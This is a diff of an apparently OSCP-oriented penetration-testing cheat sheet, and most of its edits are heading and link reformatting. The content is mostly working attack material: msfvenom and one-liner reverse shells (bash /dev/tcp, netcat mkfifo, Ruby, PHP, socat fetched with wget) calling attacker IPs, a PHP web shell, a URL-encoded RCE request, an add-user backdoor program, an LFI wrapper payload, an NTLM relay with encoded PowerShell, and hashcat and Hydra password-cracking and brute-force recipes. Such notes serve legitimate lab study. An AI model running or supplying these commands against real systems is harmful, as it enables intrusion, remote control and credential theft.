+<h4 id="aspx"><a class="header" href="#aspx">ASP/x</a></h4>
+<h5 id="reverse-shell-3"><a class="header" href="#reverse-shell-3">Reverse shell</a></h5>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp &gt;reverse.asp
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx &gt;reverse.aspx
 </code></pre>
-<h3 id="jsp"><a class="header" href="#jsp">JSP</a></h3>
-<h4 id="reverse-shell-4"><a class="header" href="#reverse-shell-4">Reverse shell</a></h4>
+<h4 id="jsp"><a class="header" href="#jsp">JSP</a></h4>
+<h5 id="reverse-shell-4"><a class="header" href="#reverse-shell-4">Reverse shell</a></h5>
 <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw&gt; reverse.jsp
 </code></pre>
-<h3 id="war"><a class="header" href="#war">WAR</a></h3>
-<h4 id="reverse-shell-5"><a class="header" href="#reverse-shell-5">Reverse Shell</a></h4>
+<h4 id="war"><a class="header" href="#war">WAR</a></h4>
+<h5 id="reverse-shell-5"><a class="header" href="#reverse-shell-5">Reverse Shell</a></h5>
 <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war &gt; reverse.war
 </code></pre>
-<h3 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h3>
+<h4 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h4>
 <pre><code>msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 </code></pre>
-<h2 id="script-language-payloads"><a class="header" href="#script-language-payloads"><strong>Script Language payloads</strong></a></h2>
-<h3 id="perl"><a class="header" href="#perl"><strong>Perl</strong></a></h3>
+<h3 id="script-language-payloads"><a class="header" href="#script-language-payloads"><strong>Script Language payloads</strong></a></h3>
+<h4 id="perl"><a class="header" href="#perl"><strong>Perl</strong></a></h4>
 <pre><code>msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.pl
 </code></pre>
-<h3 id="python"><a class="header" href="#python"><strong>Python</strong></a></h3>
+<h4 id="python"><a class="header" href="#python"><strong>Python</strong></a></h4>
 <pre><code>msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.py
 </code></pre>
-<h3 id="php-1"><a class="header" href="#php-1">PHP</a></h3>
+<h4 id="php-1"><a class="header" href="#php-1">PHP</a></h4>
 <pre><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
 </code></pre>
 <pre><code>&lt;?php
@@ -1396,7 +1399,7 @@ system('nc.exe -e cmd.exe 10.10.14.13 4444')
 
 &lt;?php system($_REQUEST["cmd"]); ?&gt;
 </code></pre>
-<h3 id="bash"><a class="header" href="#bash">BASH</a></h3>
+<h4 id="bash"><a class="header" href="#bash">BASH</a></h4>
 <pre><code>bash -i &gt;&amp; /dev/tcp//9999 0&gt;&amp;1
 
 Base One-liner for URL RCE + Encoded
@@ -1405,17 +1408,17 @@ Base One-liner for URL RCE + Encoded
 curl -k http://192.168.220.52/cmsms/uploads/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.225%2F4444%200%3E%261%22
 
 </code></pre>
-<h3 id="ruby"><a class="header" href="#ruby">RUBY</a></h3>
+<h4 id="ruby"><a class="header" href="#ruby">RUBY</a></h4>
 <pre><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
 </code></pre>
-<h3 id="netcat"><a class="header" href="#netcat">NETCAT</a></h3>
+<h4 id="netcat"><a class="header" href="#netcat">NETCAT</a></h4>
 <pre><code>nc -e /bin/sh 10.0.0.5 1234
 </code></pre>
 <pre><code>#OpenBSD netcat doesn't support -e flag. You can even try BASH 1-liner
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
 </code></pre>
-<h3 id="adduserc"><a class="header" href="#adduserc">Adduser.c</a></h3>
+<h4 id="adduserc"><a class="header" href="#adduserc">Adduser.c</a></h4>
 <p>On the Attacking machine compile it first: <code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe, then transfer it to Victim</code></p>
 <pre><code># ADDUSER.C
 
@@ -1435,7 +1438,7 @@ return 0;
 
 }
 </code></pre>
-<h3 id="socat"><a class="header" href="#socat">Socat</a></h3>
+<h4 id="socat"><a class="header" href="#socat">Socat</a></h4>
 <pre><code>#Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
@@ -1444,7 +1447,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 or Socat Command Injection one liner:
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 </code></pre>
-<h2 id="tty-shells"><a class="header" href="#tty-shells"><ins>TTY Shells</ins></a></h2>
+<h3 id="tty-shells"><a class="header" href="#tty-shells"><ins>TTY Shells</ins></a></h3>
 <p>Spawn shells</p>
 <ul>
 <li>Python: <code>python -c 'import pty; pty.spawn("/bin/sh")'</code></li>
@@ -1464,7 +1467,8 @@ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8
 <p>If you cannot obtain a full TTY, you can still interact with programs that expect user input. In the following example, the password is passed to <code>sudo</code> read a file:</p>
 <pre><code>expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "&lt;THE_PASSWORD_OF_THE_USER&gt;";send "\r\n";interact'
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><pre><code># General help
+<div style="break-before: page; page-break-before: always;"></div><h2 id="crackmapexec-cheat-sheet"><a class="header" href="#crackmapexec-cheat-sheet">CrackMapExec Cheat Sheet</a></h2>
+<pre><code># General help
 crackmapexec --help
 
 # Protocol help
@@ -1690,7 +1694,8 @@ crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M em
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="php-wrapper"><a class="header" href="#php-wrapper"><ins>PHP Wrapper</ins></a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="php-wrapper"><a class="header" href="#php-wrapper">PHP Wrapper</a></h2>
+<h3 id="links-3"><a class="header" href="#links-3">Links</a></h3>
 <ul>
 <li><a href="https://defaultcredentials.com/ctf/proving-grounds/slort-proving-grounds-walkthrough/">Slort PG Walkthrough</a></li>
 </ul>
@@ -1699,35 +1704,35 @@ crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M em
 # Hence, LFI without manipulating the local file. # ADDING SHELL EXEC IN END TO SEE
 http://&lt;IP&gt;/menu.php?file=data:text/plain,&lt;?php echo shell_exec("whoami")?&gt;
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="hashcat-cheatsheet"><a class="header" href="#hashcat-cheatsheet">Hashcat-Cheatsheet</a></h1>
-<p>Hashcat Cheatsheet for OSCP
-https://hashcat.net/wiki/doku.php?id=hashcat</p>
-<h2 id="identify-hashes"><a class="header" href="#identify-hashes">Identify Hashes</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="hashcat-cheatsheet"><a class="header" href="#hashcat-cheatsheet">Hashcat-Cheatsheet</a></h2>
+<ul>
+<li><a href="https://hashcat.net/wiki/doku.php?id=hashcat">Hashcat wiki</a></li>
+<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat examples</a></li>
+<li><a href="http://openwall.info/wiki/john/sample-hashes">Sample Hashes</a></li>
+</ul>
+<h3 id="identify-hashes"><a class="header" href="#identify-hashes">Identify Hashes</a></h3>
 <p><code>hash-identifier</code></p>
-<p>Example Hashes: https://hashcat.net/wiki/doku.php?id=example_hashes</p>
-<h2 id="max-power"><a class="header" href="#max-power">MAX POWER!</a></h2>
+<h3 id="max-power"><a class="header" href="#max-power">MAX POWER!</a></h3>
 <p>I have found that I can squeeze some more power out of my hash cracking by adding these parameters:</p>
 <pre><code>--force -O -w 4 --opencl-device-types 1,2
 </code></pre>
 <p>These will force Hashcat to use the CUDA GPU interface which is buggy but provides more performance (–force) , will Optimize for 32 characters or less passwords (-O) and will set the workload to "Insane" (-w 4) which is supposed to make your computer effectively unusable during the cracking process.
 Finally "--opencl-device-types 1,2 " will force HashCat to use BOTH the GPU and the CPU to handle the cracking.</p>
-<h2 id="using-hashcat-and-a-dictionary"><a class="header" href="#using-hashcat-and-a-dictionary">Using hashcat and a dictionary</a></h2>
+<h3 id="using-hashcat-and-a-dictionary"><a class="header" href="#using-hashcat-and-a-dictionary">Using hashcat and a dictionary</a></h3>
 <p>Create a .hash file with all the hashes you want to crack puthasheshere.hash: $1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/</p>
 <p>Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:</p>
 <p><code>hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></p>
 <p>Hashcat example cracking Wordpress passwords using rockyou:<br />
 <code>hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt</code></p>
-<p>Sample Hashes
-http://openwall.info/wiki/john/sample-hashes</p>
-<h2 id="hashcat-one-rule-to-rule-them-all"><a class="header" href="#hashcat-one-rule-to-rule-them-all">HashCat One Rule to Rule them All</a></h2>
+<h3 id="hashcat-one-rule-to-rule-them-all"><a class="header" href="#hashcat-one-rule-to-rule-them-all">HashCat One Rule to Rule them All</a></h3>
 <p>Not So Secure has built a custom rule that I have had luck with in the past:<br />
-https://www.notsosecure.com/one-rule-to-rule-them-all/<br />
+<a href="https://www.notsosecure.com/one-rule-to-rule-them-all/">Custom Rules</a>
 The rule can be downloaded from their Github site:<br />
-https://github.com/NotSoSecure/password_cracking_rules</p>
+<a href="https://github.com/NotSoSecure/password_cracking_rules">Github Link</a></p>
 <p>I typically drop OneRuleToRuleThemAll.rule into the rules subfolder and run it like this from my windows box (based on the notsosecure article):</p>
 <pre><code>hashcat64.exe --force -m300 --status -w3 -o found.txt --remove --potfile-disable -r rules\OneRuleToRuleThemAll.rule hash.txt rockyou.txt
 </code></pre>
-<h2 id="using-hashcat-bruteforcing"><a class="header" href="#using-hashcat-bruteforcing">Using hashcat bruteforcing</a></h2>
+<h3 id="using-hashcat-bruteforcing"><a class="header" href="#using-hashcat-bruteforcing">Using hashcat bruteforcing</a></h3>
 <pre><code>predefined charsets
 ?l = abcdefghijklmnopqrstuvwxyz
 ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
@@ -1740,7 +1745,7 @@ https://github.com/NotSoSecure/password_cracking_rules</p>
 ?ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</p>
 <p>Brute force all passwords length 1-8 with possible characters A-Z a-z 0-9<br />
 <code>hashcat64 -m 500 hashes.txt -a  3  ?1?1?1?1?1?1?1?1 --increment -1 ?l?d?u</code></p>
-<h2 id="cracking-linux-hashes---etcshadow-file"><a class="header" href="#cracking-linux-hashes---etcshadow-file">Cracking Linux Hashes - /etc/shadow file</a></h2>
+<h3 id="cracking-linux-hashes---etcshadow-file"><a class="header" href="#cracking-linux-hashes---etcshadow-file">Cracking Linux Hashes - /etc/shadow file</a></h3>
 <div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
 <tr><td>500</td><td>md5crypt $1$, MD5(Unix)</td><td>Operating-Systems</td></tr>
 <tr><td>200</td><td>bcrypt $2*$, Blowfish(Unix)</td><td>Operating-Systems</td></tr>
@@ -1748,13 +1753,13 @@ https://github.com/NotSoSecure/password_cracking_rules</p>
 <tr><td>1800</td><td>sha512crypt $6$, SHA512(Unix)</td><td>Operating-Systems</td></tr>
 </tbody></table>
 </div>
-<h2 id="cracking-windows-hashes"><a class="header" href="#cracking-windows-hashes">Cracking Windows Hashes</a></h2>
+<h3 id="cracking-windows-hashes"><a class="header" href="#cracking-windows-hashes">Cracking Windows Hashes</a></h3>
 <div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
 <tr><td>3000</td><td>LM</td><td>Operating-Systems</td></tr>
 <tr><td>1000</td><td>NTLM</td><td>Operating-Systems</td></tr>
 </tbody></table>
 </div>
-<h2 id="cracking-common-application-hashes"><a class="header" href="#cracking-common-application-hashes">Cracking Common Application Hashes</a></h2>
+<h3 id="cracking-common-application-hashes"><a class="header" href="#cracking-common-application-hashes">Cracking Common Application Hashes</a></h3>
 <div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
 <tr><td>900</td><td>MD4</td><td>Raw Hash</td></tr>
 <tr><td>0</td><td>MD5</td><td>Raw Hash</td></tr>
@@ -1765,7 +1770,7 @@ https://github.com/NotSoSecure/password_cracking_rules</p>
 <tr><td>1700</td><td>SHA-512</td><td>Raw Hash</td></tr>
 </tbody></table>
 </div>
-<h2 id="cracking-common-file-password-protections"><a class="header" href="#cracking-common-file-password-protections">Cracking Common File Password Protections</a></h2>
+<h3 id="cracking-common-file-password-protections"><a class="header" href="#cracking-common-file-password-protections">Cracking Common File Password Protections</a></h3>
 <div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
 <tr><td>11600</td><td>7-Zip</td><td>Archives</td></tr>
 <tr><td>12500</td><td>RAR3-hp</td><td>Archives</td></tr>
@@ -1791,7 +1796,7 @@ https://github.com/NotSoSecure/password_cracking_rules</p>
 <tr><td>16200</td><td>Apple Secure Notes</td><td>Documents</td></tr>
 </tbody></table>
 </div>
-<h2 id="cracking-commmon-database-hash-formats"><a class="header" href="#cracking-commmon-database-hash-formats">Cracking Commmon Database Hash Formats</a></h2>
+<h3 id="cracking-common-database-hash-formats"><a class="header" href="#cracking-common-database-hash-formats">Cracking Common Database Hash Formats</a></h3>
 <div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th><th>Example Hash</th></tr></thead><tbody>
 <tr><td>12</td><td>PostgreSQL</td><td>Database Server</td><td>a6343a68d964ca596d9752250d54bb8a:postgres</td></tr>
 <tr><td>131</td><td>MSSQL (2000)</td><td>Database Server</td><td>0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578</td></tr>
@@ -1805,7 +1810,7 @@ https://github.com/NotSoSecure/password_cracking_rules</p>
 <tr><td>8000</td><td>Sybase ASE</td><td>Database Server</td><td>0xc00778168388631428230545ed2c976790af96768afa0806fe6c0da3b28f3e132137eac56f9bad027ea2</td></tr>
 </tbody></table>
 </div>
-<h2 id="cracking-ntlm-hashes"><a class="header" href="#cracking-ntlm-hashes">Cracking NTLM hashes</a></h2>
+<h3 id="cracking-ntlm-hashes"><a class="header" href="#cracking-ntlm-hashes">Cracking NTLM hashes</a></h3>
 <p>After grabbing or dumping the NTDS.dit and SYSTEM registry hive or dumping LSASS memory from a Windows box, you will often end up with NTLM hashes.</p>
 <div class="table-wrapper"><table><thead><tr><th>Path</th><th>Description</th></tr></thead><tbody>
 <tr><td>C:\Windows\NTDS\ntds.dit</td><td>Active Directory database</td></tr>
@@ -1822,7 +1827,7 @@ https://github.com/NotSoSecure/password_cracking_rules</p>
 Speed: 7000 MH/s
 Recovery Rate: 12.47%
 Elapsed Time: 2 Hours 35 Minutes</p>
-<h2 id="cracking-hashes-from-kerboroasting---krb5tgs"><a class="header" href="#cracking-hashes-from-kerboroasting---krb5tgs">Cracking Hashes from Kerboroasting - KRB5TGS</a></h2>
+<h3 id="cracking-hashes-from-kerboroasting---krb5tgs"><a class="header" href="#cracking-hashes-from-kerboroasting---krb5tgs">Cracking Hashes from Kerboroasting - KRB5TGS</a></h3>
 <p>A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.
 KRB5TGS - Kerberoasting Service Accounts that use SPN Once you have identified a Kerberoastable service account (Bloodhound? Powershell Empire? - likely a MS SQL Server Service Account), any AD user can request a krb5tgs hash from it which can be used to crack the password.</p>
 <p>Based on my benchmarking, KRB5TGS cracking is 28 times slower than NTLM.</p>
@@ -1839,33 +1844,35 @@ KRB5TGS - Kerberoasting Service Accounts that use SPN Once you have identified a
 <p><em>Benchmark using a Nvidia 2060 GTX:</em>
 Speed: 250 MH/s
 Elapsed Time: 9 Minutes</p>
-<h2 id="cracking-ntlmv2-hashes-from-a-packet-capture"><a class="header" href="#cracking-ntlmv2-hashes-from-a-packet-capture">Cracking NTLMv2 Hashes from a Packet Capture</a></h2>
+<h3 id="cracking-ntlmv2-hashes-from-a-packet-capture"><a class="header" href="#cracking-ntlmv2-hashes-from-a-packet-capture">Cracking NTLMv2 Hashes from a Packet Capture</a></h3>
 <p>You may be asked to recover a password from an SMB authentication (NTLMv2) from a Packet Capture.
 The following is a 9-step process for formatting the hash correctly to do this.
-https://research.801labs.org/cracking-an-ntlmv2-hash/</p>
-<h2 id="to-crack-linux-hashes-you-must-first-unshadow-them"><a class="header" href="#to-crack-linux-hashes-you-must-first-unshadow-them">To crack linux hashes you must first unshadow them</a></h2>
+<a href="https://research.801labs.org/cracking-an-ntlmv2-hash/">9-step Process</a></p>
+<h3 id="to-crack-linux-hashes-you-must-first-unshadow-them"><a class="header" href="#to-crack-linux-hashes-you-must-first-unshadow-them">To crack linux hashes you must first unshadow them</a></h3>
 <p><code>unshadow passwd-file.txt shadow-file.txt</code></p>
 <p><code>unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt</code></p>
-<h2 id="crack-a-zip-password"><a class="header" href="#crack-a-zip-password">Crack a zip password</a></h2>
+<h3 id="crack-a-zip-password"><a class="header" href="#crack-a-zip-password">Crack a zip password</a></h3>
 <p><code>zip2john Zipfile.zip | cut -d ':' -f 2 &gt; hashes.txt</code><br />
 <code>hashcat -a 0 -m 13600 hashes.txt /usr/share/wordlists/rockyou.txt</code></p>
 <p>Hashcat appears to have issues with some zip hash formats generated from zip2john.  You can fix this by editing the zip hash contents to align with the example zip hash format found on the hash cat example page:
 <code>$zip2$*0*3*0*b5d2b7bf57ad5e86a55c400509c672bd*d218*0**ca3d736d03a34165cfa9*$/zip2$</code></p>
 <p>John seems to accept a wider range of zip formats for cracking.</p>
-<h2 id="prince-password-generation"><a class="header" href="#prince-password-generation">PRINCE Password Generation</a></h2>
+<h3 id="prince-password-generation"><a class="header" href="#prince-password-generation">PRINCE Password Generation</a></h3>
 <p>PRINCE (PRobability INfinite Chained Elements) is a hashcat utility for randomly generating probable passwords:</p>
 <pre><code>pp64.bin --pw-min=8 &lt; dict.txt | head -20 shuf dict.txt | pp64.bin --pw-min=8 | head -20
 </code></pre>
 <p>Reference:<br />
-https://github.com/hashcat/princeprocessor</p>
-<h2 id="purple-rain"><a class="header" href="#purple-rain">Purple Rain</a></h2>
+<a href="https://github.com/hashcat/princeprocessor">Prince Reference</a></p>
+<h3 id="purple-rain"><a class="header" href="#purple-rain">Purple Rain</a></h3>
 <p>Purple Rain attack uses a combination of Prince, a dictionary and random Mutation rules to dynamicaly create infinite combinations of passwords.</p>
 <pre><code>shuf dict.txt | pp64.bin --pw-min=8 | hashcat -a 0 -m #type -w 4 -O hashes.txt -g 300000
 </code></pre>
 <p>Reference:<br />
-https://www.netmux.com/blog/purple-rain-attack</p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="hydra-notes"><a class="header" href="#hydra-notes">Hydra notes</a></h1>
-<p>https://medium.com/@joshthedev/step-10-login-brute-forcing-e709b4b60637</p>
+<a href="https://www.netmux.com/blog/purple-rain-attack">Rain Reference</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="hydra-notes"><a class="header" href="#hydra-notes">Hydra notes</a></h2>
+<ul>
+<li><a href="https://medium.com/@joshthedev/step-10-login-brute-forcing-e709b4b60637">Hydra Medium Article</a></li>
+</ul>
 <p>Hydra is a very useful software when it comes to bruteforce credentials on most commonly used protocols. We are going to start with some flags which are generally used independently from the protocol, so in the examples when we will see these flags, we can immediately understand what they are used for. Here is a list of common and general flags used with Hydra:</p>
 <ul>
 <li><code>-L &lt;filepath&gt;</code> for the file path to use for usernames, separated by newlines</li>
@@ -1882,8 +1889,8 @@ https://www.netmux.com/blog/purple-rain-attack</p>
 <li><code>-f</code> this flag when activated, will let hydra terminate as soon as it finds a single correct credential pair, so as soon as it succeeds it exits, this happens per host if we specify -M (so a set of machines)</li>
 <li><code>-F</code> exits after the first found login/password pair for any host (for usage with -M)</li>
 </ul>
-<h2 id="http"><a class="header" href="#http"><a href="https://github.com/gnebbia/hydra_notes#http"></a>HTTP</a></h2>
-<h3 id="http-basic-authentication"><a class="header" href="#http-basic-authentication"><a href="https://github.com/gnebbia/hydra_notes#http-basic-authentication"></a>HTTP Basic Authentication</a></h3>
+<h3 id="http"><a class="header" href="#http">HTTP</a></h3>
+<h3 id="http-basic-authentication"><a class="header" href="#http-basic-authentication">HTTP Basic Authentication</a></h3>
 <p>We can use the following commands for Basic HTTP Authentication, we can understand that the authentication is basic from the headers of the response.</p>
 <pre><code class="language-shell">hydra -L users.txt -P words.txt www.site.com http-head /private/
 # we provide users.txt as files containing users
@@ -1903,7 +1910,7 @@ https://www.netmux.com/blog/purple-rain-attack</p>
 # `-e ns`, so we are also trying with an empty password for each
 # of the users and with passwords equal to the username for each user
 </code></pre>
-<h3 id="http-digest-authentication"><a class="header" href="#http-digest-authentication"><a href="https://github.com/gnebbia/hydra_notes#http-digest-authentication"></a>HTTP Digest Authentication</a></h3>
+<h3 id="http-digest-authentication"><a class="header" href="#http-digest-authentication">HTTP Digest Authentication</a></h3>
 <pre><code class="language-shell">hydra -l root -P test.txt -vV localhost http-get /forbidden-d2
 # uses the username root with passwords from the file called test.txt
 # it runs in verbose mode on localhost through http-get module we specify
@@ -1916,7 +1923,7 @@ https://www.netmux.com/blog/purple-rain-attack</p>
 # the http-get module is specified to denote the presence of an HTTP digest
 # authentication at the path /get_camera_params.cgi
 </code></pre>
-<h3 id="http-forms"><a class="header" href="#http-forms"><a href="https://github.com/gnebbia/hydra_notes#http-forms"></a>HTTP Forms</a></h3>
+<h3 id="http-forms"><a class="header" href="#http-forms">HTTP Forms</a></h3>
 <p>When it comes to HTTP login forms, we generally have to inspect the web application, searching for messages which will appear on successful or failed logins.</p>
 <p>Generally for HTTP forms we will have hydra commands with the following structure:</p>
 <pre><code class="language-shell">hydra -L &lt;users_file&gt; -P &lt;password_file&gt; &lt;url&gt; http[s]-[post|get]-form \
@@ -1946,7 +1953,7 @@ https://www.netmux.com/blog/purple-rain-attack</p>
  # as we may notice as request line we have the following structure
  # page:parameters:S=message_to_show_in_case_of_failure
 </code></pre>
-<h3 id="http-get-login-forms"><a class="header" href="#http-get-login-forms"><a href="https://github.com/gnebbia/hydra_notes#http-get-login-forms"></a>HTTP Get Login Forms</a></h3>
+<h3 id="http-get-login-forms"><a class="header" href="#http-get-login-forms">HTTP Get Login Forms</a></h3>
 <pre><code class="language-shell">hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \
 http-get-form "/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect."
 </code></pre>
@@ -1954,7 +1961,7 @@ http-get-form "/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Lo
   -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
 "/DVWA/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
 </code></pre>
-<h3 id="http-post-login-forms"><a class="header" href="#http-post-login-forms"><a href="https://github.com/gnebbia/hydra_notes#http-post-login-forms"></a>HTTP Post Login Forms</a></h3>
+<h3 id="http-post-login-forms"><a class="header" href="#http-post-login-forms">HTTP Post Login Forms</a></h3>
 <pre><code class="language-shell">hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&amp;pass=^PASS^:Bad login" \
 -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
 # Here we specified:
@@ -1985,14 +1992,14 @@ http-get-form "/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Lo
 # header to redirect the user, we can think about S as a sort of grep applied to
 # the HTTP response
 </code></pre>
-<h2 id="smtp"><a class="header" href="#smtp"><a href="https://github.com/gnebbia/hydra_notes#smtp"></a>SMTP</a></h2>
+<h3 id="smtp"><a class="header" href="#smtp">SMTP</a></h3>
 <pre><code class="language-shell">hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Desktop/rockyou.txt' -s portnumber -S -v 
 </code></pre>
 <p>Generally the port used for SMTP is 465 and common SMTP server for common email services are: * smtp.mail.yahoo.com * smtp.gmail.com * smtp.live.com (but on poort 587)</p>
-<h2 id="telnet"><a class="header" href="#telnet"><a href="https://github.com/gnebbia/hydra_notes#telnet"></a>Telnet</a></h2>
+<h3 id="telnet"><a class="header" href="#telnet">Telnet</a></h3>
 <pre><code class="language-shell">hydra -l &lt;username&gt; -P &lt;password_file&gt; telnet://targetname
 </code></pre>
-<h2 id="ssh"><a class="header" href="#ssh"><a href="https://github.com/gnebbia/hydra_notes#ssh"></a>SSH</a></h2>
+<h3 id="ssh"><a class="header" href="#ssh">SSH</a></h3>
 <pre><code class="language-shell">hydra -l root -M /path/to/ip/list.txt -P /path/to/passwordlist.txt ssh -t 4
 </code></pre>
 <p>Notice that with some services, we may need to use the recommended number of tasks. In case of SSH if we use more than 4 tasks we may get errors.</p>
@@ -2008,12 +2015,12 @@ http-get-form "/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Lo
 # tries the users from logins.txt and the paasswords from pws.txt
 # on all the machines listed on targests.txt on the ssh port/service
 </code></pre>
-<h2 id="ftp"><a class="header" href="#ftp"><a href="https://github.com/gnebbia/hydra_notes#ftp"></a>FTP</a></h2>
+<h3 id="ftp"><a class="header" href="#ftp">FTP</a></h3>
 <pre><code class="language-shell">hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
 </code></pre>
 <pre><code class="language-shell">hydra -l user -P passlist.txt ftp://192.168.0.1
 </code></pre>
-<h2 id="mysql-and-other-databases"><a class="header" href="#mysql-and-other-databases"><a href="https://github.com/gnebbia/hydra_notes#mysql-and-other-databases"></a>MySQL and other databases</a></h2>
+<h3 id="mysql-and-other-databases"><a class="header" href="#mysql-and-other-databases">MySQL and other databases</a></h3>
 <p>We can use hydra with many kinds of databases, anyway it is very important for us to check that we have installed hydra with the adequate module to perform a specific bruteforce.</p>
 <p><strong>IMPORTANT</strong>: if we did not install hydra with mysql5 support it will not work, we can check the modules available by issuing a <code>hydra -h</code>, if we just see <code>mysql(v4)</code> this means that our version will not be compatible with <code>mysql5</code>, while if we see <code>mysql</code> then our version of hydra will be compatible also with mysql5 databases.</p>
 <pre><code class="language-shell">hydra -L &lt;your_username_file&gt; -P &lt;your_password_file&gt; &lt;IP&gt; mysql -s 3306 -o output.txt
@@ -2023,7 +2030,7 @@ http-get-form "/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Lo
  # by default mysql uses port 3306 so we do not need to specify it,
  # anyway it is fundamental to specify it if the mysql port is different
 </code></pre>
-<h2 id="appendix-a-sending-hydra-traffic-through-proxy"><a class="header" href="#appendix-a-sending-hydra-traffic-through-proxy"><a href="https://github.com/gnebbia/hydra_notes#appendix-a-sending-hydra-traffic-through-proxy"></a>Appendix A: Sending Hydra traffic through Proxy</a></h2>
+<h3 id="appendix-a-sending-hydra-traffic-through-proxy"><a class="header" href="#appendix-a-sending-hydra-traffic-through-proxy">Appendix A: Sending Hydra traffic through Proxy</a></h3>
 <p>It is often useful to analyze what we are actually doing with hydra, to this purpose we can send the traffic to an intercepting proxy such as Burp.</p>
 <p>To do this, we just have to set an environment variable:</p>
 <pre><code class="language-shell">export HYDRA_PROXY=http://127.0.0.1:8080
@@ -2037,8 +2044,11 @@ E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
      % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
      % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="bruteforce"><a class="header" href="#bruteforce">Bruteforce</a></h2>
+<h3 id="links-4"><a class="header" href="#links-4">Links</a></h3>
+<ul>
 <li><a href="http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/">HTTP Basic Auth Hydra</a></li>
+<li><a href="https://crackstation.net/">CrackStation</a></li>
 </ul>
 <h3 id="create-wordlist"><a class="header" href="#create-wordlist">Create Wordlist</a></h3>
 <h4 id="cewl--hydra"><a class="header" href="#cewl--hydra">Cewl + Hydra</a></h4>
@@ -2202,7 +2212,8 @@ For the relay do this instead of responder:
 
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 </code></pre>
